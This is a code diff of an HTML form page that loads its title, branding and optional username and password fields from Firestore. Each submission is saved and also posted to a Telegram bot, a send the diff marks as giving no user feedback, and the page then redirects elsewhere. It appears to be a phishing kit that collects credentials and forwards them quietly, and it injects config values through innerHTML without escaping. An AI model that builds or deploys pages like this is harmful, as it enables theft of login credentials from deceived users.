@@ -5,12 +5,84 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Form Submission</title>
 <style>
-body{font-family:Arial,sans-serif;background:#f4f6f8;padding:20px}
-#formContainer{max-width:600px;margin:auto;background:#fff;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1)}
-input,textarea,button{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
-button{cursor:pointer;background:#1976d2;color:#fff;border:none}
-h2{text-align:center}
-.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px;word-break:break-all}
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: #121212;
+  color: #e0e0e0;
+  margin: 0;
+  padding: 20px;
+}
+#formContainer {
+  max-width: 600px;
+  margin: auto;
+  background: #1e1e1e;
+  padding: 20px;
+  border-radius: 12px;
+  box-shadow: 0 6px 20px rgba(0,0,0,0.5);
+}
+h2 {
+  text-align: center;
+  margin-bottom: 10px;
+  color: #00bcd4;
+}
+#formDesc {
+  text-align: center;
+  margin-bottom: 20px;
+  color: #b0b0b0;
+}
+input, textarea {
+  width: 100%;
+  padding: 10px;
+  margin: 8px 0;
+  border-radius: 6px;
+  border: 1px solid #555;
+  background: #121212;
+  color: #e0e0e0;
+  box-sizing: border-box;
+}
+input::placeholder {
+  color: #888;
+}
+button {
+  width: 100%;
+  padding: 10px;
+  margin-top: 12px;
+  border-radius: 6px;
+  border: none;
+  cursor: pointer;
+  font-weight: bold;
+  color: #fff;
+  background: #1976d2;
+  transition: transform 0.1s ease;
+}
+button:hover {
+  transform: scale(1.02);
+}
+#embedLinks .embedLink {
+  margin-top: 6px;
+  padding: 6px;
+  background: #2a2a2a;
+  border-radius: 6px;
+  word-break: break-all;
+  color: #e0e0e0;
+}
+#warningMsg {
+  color: #f44336;
+  font-weight: bold;
+  text-align: center;
+  margin-bottom: 8px;
+}
+img.avatar {
+  width: 90px;
+  border-radius: 50%;
+  display: block;
+  margin: auto 0 10px auto;
+}
+img.logo {
+  width: 140px;
+  display: block;
+  margin: auto 0 15px auto;
+}
 </style>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
@@ -19,9 +91,9 @@ h2{text-align:center}
 <div id="formContainer">
 <h2 id="formTitle">Loading...</h2>
 <div id="formDesc"></div>
+<div id="warningMsg"></div>
 <form id="dynamicForm"></form>
 <div id="embedLinks"></div>
-<div id="submitResult" style="margin-top:10px;color:green;font-weight:bold"></div>
 </div>
 
 <script>
@@ -38,6 +110,7 @@ const urlParams = new URLSearchParams(window.location.search);
 const formId = urlParams.get("id");
 const formEl = $("dynamicForm");
 const embedEl = $("embedLinks");
+const warningEl = $("warningMsg");
 
 let formConfig = null;
 
@@ -61,25 +134,23 @@ db.collection("forms").doc(formId).get().then(doc=>{
 // Render the form dynamically
 function renderForm(){
   $("formTitle").innerText = formConfig.title;
-  $("formTitle").style.color = formConfig.titleColor;
-  $("formDesc").innerText = formConfig.description;
-  $("formDesc").style.color = formConfig.textColor;
+  $("formTitle").style.color = formConfig.titleColor || "#00bcd4";
+  $("formDesc").innerText = formConfig.description || "";
+  $("formDesc").style.color = formConfig.textColor || "#b0b0b0";
 
   formEl.innerHTML = "";
 
   // Avatar & Logo
-  if(formConfig.avatarURL) formEl.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%;display:block;margin:auto">`;
-  if(formConfig.logoURL) formEl.innerHTML += `<img src="${formConfig.logoURL}" style="width:140px;display:block;margin:auto">`;
+  if(formConfig.avatarURL) formEl.innerHTML += `<img src="${formConfig.avatarURL}" class="avatar">`;
+  if(formConfig.logoURL) formEl.innerHTML += `<img src="${formConfig.logoURL}" class="logo">`;
 
-  // Warning
-  if(formConfig.enableWarning && formConfig.warningPosition!=="none"){
-    formEl.innerHTML += `<p style="color:#b71c1c;text-align:${formConfig.warningPosition}">${formConfig.warning}</p>`;
-  }
+  // Warning inside form
+  warningEl.innerText = "";
 
   // Username & Password
   if(formConfig.addAuth){
-    formEl.innerHTML += `<input name="username" placeholder="${formConfig.usernamePlaceholder}" required>`;
-    formEl.innerHTML += `<input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>`;
+    formEl.innerHTML += `<input name="username" placeholder="${formConfig.usernamePlaceholder || 'Username'}" required>`;
+    formEl.innerHTML += `<input type="password" name="password" placeholder="${formConfig.passwordPlaceholder || 'Password'}" required>`;
   }
 
   // Extra fields
@@ -101,8 +172,8 @@ function renderForm(){
   // Main Button
   if(formConfig.showMainBtn){
     const btn = document.createElement("button");
-    btn.textContent = formConfig.buttonText;
-    btn.style.background = formConfig.btnColor;
+    btn.textContent = formConfig.buttonText || "Submit";
+    btn.style.background = formConfig.btnColor || "#1976d2";
     btn.onclick = submitForm;
     formEl.appendChild(btn);
   }
@@ -111,25 +182,30 @@ function renderForm(){
 // Submit Form
 function submitForm(e){
   e.preventDefault();
+  warningEl.innerText = ""; // reset warning
+
   const formData = {};
   const inputs = formEl.querySelectorAll("input,textarea");
   inputs.forEach(i=>{
     formData[i.name] = i.value;
   });
 
-  // Save to Firestore submissions
   db.collection("submissions").add({
     formId,
     data: formData,
     createdAt: new Date().toISOString()
   }).then(()=>{
-    $("submitResult").innerText = "✅ Submission saved!";
+    // Redirect if enabled
+    if(formConfig.enableRedirect && formConfig.redirectURL){
+      setTimeout(()=>window.location.href = formConfig.redirectURL, 500);
+    }
+    formEl.reset();
   }).catch(err=>{
-    $("submitResult").innerText = "❌ Error saving submission";
     console.error(err);
+    warningEl.innerText = "❌ Try again!";
   });
 
-  // Send to Telegram
+  // Send to Telegram (no UI feedback)
   const telegramMsg = `📝 New Form Submission\n------------------\n`+
     Object.entries(formData).map(([k,v])=>`💠 ${k}: ${v}`).join("\n");
 
@@ -141,14 +217,6 @@ function submitForm(e){
       text: telegramMsg
     })
   });
-
-  // Redirect if enabled
-  if(formConfig.enableRedirect && formConfig.redirectURL){
-    setTimeout(()=>window.location.href = formConfig.redirectURL, 1500);
-  }
-
-  // Reset form
-  formEl.reset();
 }
 </script>
 </body>
